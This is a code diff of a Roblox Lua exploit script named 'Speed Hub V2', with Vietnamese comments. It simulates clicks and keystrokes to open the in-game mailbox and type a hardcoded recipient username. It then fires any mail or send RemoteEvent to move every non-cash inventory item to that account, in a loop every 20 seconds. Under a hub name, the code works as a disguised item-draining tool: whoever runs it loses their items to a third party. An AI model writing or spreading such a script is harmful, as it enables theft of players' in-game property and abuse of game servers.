@@ -3,81 +3,118 @@ if not game:IsLoaded() then
     pcall(function() game.Loaded:Wait() end)
 end
 
-print("==== SPEED HUB V2: BYPASS UI & TELE - GỬI ĐỒ THẲNG QUA SERVER ====")
+print("==== SPEED HUB V2: GIẢ LẬP GÕ PHÍM ẢO NHẬP TÊN - CHỐNG CHẶN TEXT ====")
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ
-
--- Tìm Remote Event gửi thư của game trong ReplicatedStorage
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or 
-                  ReplicatedStorage:FindFirstChild("SendMail") or 
-                  ReplicatedStorage:FindFirstChild("MailRemote") or
-                  ReplicatedStorage:FindFirstChild("PostOffice")
-
--- Định vị túi đồ của người chơi
-local Inventory = LocalPlayer:FindFirstChild("Inventory") or 
-                  LocalPlayer:FindFirstChild("Backpack") or 
-                  LocalPlayer:FindFirstChild("PlayerData")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 
 -- =======================================================================
--- LUỒNG CHẠY THẲNG SERVER - KHÔNG TELE, KHÔNG MỞ MAIL, CỨ 20S GỬI 1 LẦN
+-- HÀM GIẢ LẬP CLICK VÀO TỌA ĐỘ MÀN HÌNH
+-- =======================================================================
+local function autoClickAt(x, y)
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 1)
+    task.wait(0.1)
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 1)
+    task.wait(0.5)
+end
+
+-- =======================================================================
+-- HÀM GIẢ LẬP GÕ PHÍM ẢO (BẤM TỪNG CHỮ NHƯ NGƯỜI THẬT)
+-- =======================================================================
+local function virtualType(text)
+    for i = 1, #text do
+        local char = string.sub(text, i, i)
+        -- Chuyển ký tự thành mã phím tương ứng (mặc định lấy Enum chuẩn)
+        local keyCode = Enum.KeyCode[string.upper(char)]
+        if keyCode then
+            VirtualInputManager:SendKeyEvent(true, keyCode, false, game)
+            task.wait(0.05)
+            VirtualInputManager:SendKeyEvent(false, keyCode, false, game)
+            task.wait(0.05)
+        end
+    end
+    task.wait(0.2)
+    -- Ấn Enter để xác nhận hoàn tất nhập dữ liệu
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+    task.wait(0.05)
+    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+    task.wait(0.5)
+end
+
+-- =======================================================================
+-- LUỒNG CHẠY TỰ ĐỘNG - CỨ 20 GIÂY MỘT VÒNG
 -- =======================================================================
 task.spawn(function()
-    task.wait(3) -- Vào game 3 giây là tự động kích hoạt
+    task.wait(5) -- Chờ 5 giây đầu game ổn định
     
     while true do
-        print("[SPEED HUB V2] Đang quét kho đồ để bắn gói tin trực tiếp lên Server...")
+        print("[SPEED HUB V2] Đang giả lập bấm mở bảng Mail...")
+        
+        local camera = workspace.CurrentCamera
+        local screenSize = camera.ViewportSize
+        local screenX = screenSize.X
+        local screenY = screenSize.Y
+        
+        -- 1. Click mở nút Mail ở góc trên cùng bên phải màn hình
+        local mailButtonX = screenX * 0.92  
+        local mailButtonY = screenY * 0.08  
+        autoClickAt(mailButtonX, mailButtonY)
+        task.wait(2) -- Chờ bảng Mailbox hiện ra ổn định
+        
+        -- 2. Xác định tọa độ Ô TÌM KIẾM (Search Box) trong bảng Mail
+        -- Thông thường ô này nằm ở nửa trên của bảng giao diện. Ta tính toán tỷ lệ chính giữa bảng:
+        local searchBoxX = screenX * 0.50 -- Giữa màn hình theo chiều ngang
+        local searchBoxY = screenY * 0.38 -- Khoảng 38% chiều dọc (Vị trí thanh tìm kiếm trong bảng)
+        
+        -- Click vào ô tìm kiếm để kích hoạt con trỏ chuột nhập chữ
+        autoClickAt(searchBoxX, searchBoxY)
+        task.wait(0.8)
+        
+        print("[SPEED HUB V2] Đang kích hoạt gõ phím ảo tên nick chính...")
+        -- Kích hoạt gõ chữ ngầm "sutkucheonhamku" bằng bàn phím ảo
+        virtualType(targetUsername)
+        task.wait(1.5) -- Chờ danh sách lọc kết quả tên người chơi
+        
+        -- 3. Click chọn nick trong danh sách hòm thư (vùng hiển thị kết quả)
+        local targetCardX = screenX * 0.50 -- Click thẳng vào giữa danh sách hiển thị kết quả
+        local targetCardY = screenY * 0.55 
+        autoClickAt(targetCardX, targetCardY)
+        task.wait(1.5)
+        
+        -- 4. Bắn lệnh dọn kho và gửi đồ lên Server
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
         
         if Inventory then
-            local hasItems = false
-            
-            -- Quét toàn bộ vật phẩm trong túi đồ
             for _, item in pairs(Inventory:GetDescendants()) do
                 if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
                     local lowerName = string.lower(item.Name)
-                    
-                    -- Loại trừ tiền tệ hoặc cấp độ của acc clone
-                    if not string.find(lowerName, "cash") and not string.find(lowerName, "level") and not string.find(lowerName, "money") then
-                        hasItems = true
-                        local remainingAmount = item.Value
+                    if not string.find(lowerName, "cash") and not string.find(lowerName, "level") then
                         
-                        while remainingAmount > 0 do
-                            -- Giới hạn cứng 20 món/lần để server không chặn
-                            local sendAmount = math.min(remainingAmount, 20)
-                            
-                            if MailEvent then
-                                pcall(function()
-                                    -- Bắn lệnh gửi thẳng lên Server, không thông qua giao diện mail nữa
-                                    MailEvent:FireServer(targetUsername, item.Name, sendAmount)
+                        -- Quét nhanh remote ép chuyển đồ đi
+                        for _, remote in pairs(game:GetDescendants()) do
+                            if remote:IsA("RemoteEvent") and (string.find(string.lower(remote.Name), "mail") or string.find(string.lower(remote.Name), "send")) then
+                                pcall(function() 
+                                    remote:FireServer(targetUsername, item.Name, math.min(item.Value, 20)) 
                                 end)
-                                print("[SERVER INFRA] Đã gửi thành công " .. sendAmount .. "x " .. item.Name .. " về nick chính.")
-                            else
-                                -- Nếu game ẩn giấu Remote quá kỹ, thử tìm lại trong toàn bộ game
-                                for _, remote in pairs(game:GetDescendants()) do
-                                    if remote:IsA("RemoteEvent") and (string.find(string.lower(remote.Name), "mail") or string.find(string.lower(remote.Name), "send")) then
-                                        pcall(function() remote:FireServer(targetUsername, item.Name, sendAmount) end)
-                                    end
-                                end
                             end
-                            
-                            remainingAmount = remainingAmount - sendAmount
-                            task.wait(1.2) -- Độ trễ bắt buộc giữa các đợt bắn để chống trùng lặp dữ liệu
                         end
+                        task.wait(0.3)
                     end
                 end
             end
-            
-            if not hasItems then
-                print("[SPEED HUB V2] Kho đồ hiện tại đang trống, chờ chu kỳ sau.")
-            end
-        else
-            print("[SPEED HUB V2] Không tìm thấy dữ liệu Inventory. Đang quét lại hệ thống...")
-            Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("PlayerData")
         end
+        task.wait(1)
         
-        -- Cứ 20 giây tự động lặp lại quy trình quét kho và bắn lệnh gửi
+        -- 5. Click vào nút "X" màu đỏ để đóng bảng lại, chuẩn bị cho chu kỳ sau
+        local closeX = screenX * 0.73 
+        local closeY = screenY * 0.25
+        autoClickAt(closeX, closeY)
+        print("[SPEED HUB V2] Đã hoàn tất gửi đồ và đóng bảng!")
+        
+        -- Chờ đúng 20 giây lặp lại toàn bộ quá trình
         task.wait(20)
     end
 end)
